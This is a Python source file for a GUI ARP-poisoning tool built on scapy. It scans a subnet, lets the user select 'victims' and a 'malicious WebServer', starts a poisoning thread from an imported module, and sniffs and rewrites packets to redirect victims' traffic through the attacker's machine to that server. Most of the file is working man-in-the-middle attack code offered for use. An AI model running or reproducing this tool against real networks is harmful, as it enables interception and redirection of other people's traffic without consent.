from scapy.all import *
from poison import poison
import threading
from Tkinter import*
import sys
import os


class arpPoisoning():
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def selMalWebSrv(self):
        self.maliciousWebServer = []
        for widget in self.root.winfo_children():
            widget.destroy()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)
        Label(self.root, text='Select the malicious WebServer').pack()
        selectTargetIP = Listbox(self.root, selectmode="single", width=50)
        for each_item in range(len(OPTIONS)):
            selectTargetIP.insert(END, OPTIONS[each_item])
        selectTargetIP.pack()

        def get_target(self):
            for i in selectTargetIP.curselection():
                InIpArp = int(i)
                self.maliciousWebServer.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.myMAC = get_if_hwaddr(self.interface)
            proc_thread = None
            proc_thread = threading.Thread(target=self.startProcess)
            proc_thread.daemon = True
            proc_thread.start()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()

    def select_arp_IP(self):
        self.target = []
        Label(self.root, text='Select the victim/victims').pack()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def selectIpArp(self):
            for i in select.curselection():
                InIpArp = int(i)
                self.target.append(
                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.selMalWebSrv()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:selectIpArp(self)).pack()

    def getInput(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IPs (i.e.: 192.168.56.0/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.rangeIPs = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    def startProcess(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        self.initShow()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        self.initThread()
        while True:
            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)

    def initShow(self):
        scroll = Scrollbar(self.root)
        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.show.yview)
        self.show.pack()
        self.show.see(END)
        self.show.update_idletasks()

    def initThread(self):
        proc_thread = None
        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
        proc_thread = threading.Thread(target=process.poison)
        proc_thread.daemon = True
        proc_thread.start()

    def packetForwarding(self, packet):
        if packet.haslayer(Ether) and packet.haslayer(IP):#check IP&Arp Layer
            sender= None
            senderfound = False
            receiver = None
            receiverfound = False
            for vict in self.target:
                if (vict["mac"] == packet[Ether].src):
                    sender, senderfound = self.SndFound(vict)
                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
            if ((not senderfound) or (not receiverfound)):
                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
                    for vict in self.target:
                        if (vict["ip"] == packet[IP].dst):
                            receiver, receiverfound = self.rcvFound(vict)
            if (senderfound and receiverfound):
                self.modifyAndSend(packet, sender, receiver)

    def rcvFound(self, subj):
        receiver = subj
        receiverfound = True
        return receiver,receiverfound

    def SndFound(self, subj):
        sender = subj
        senderfound = True
        return sender,senderfound

    def modifyAndSend(self, packet, sender, receiver):
        packet[Ether].src = self.myMAC
        packet[Ether].dst = receiver["mac"]
        sendp(packet, iface=self.interface, verbose=False)
        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
        self.show.see(END)
        self.show.update_idletasks()

    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
        self.rangeIPs = rangeIPs
        self.usedIPs = usedIPs
        self.target = target
        self.maliciousWebServer = maliciousWebServer
        self.myMAC = myMAC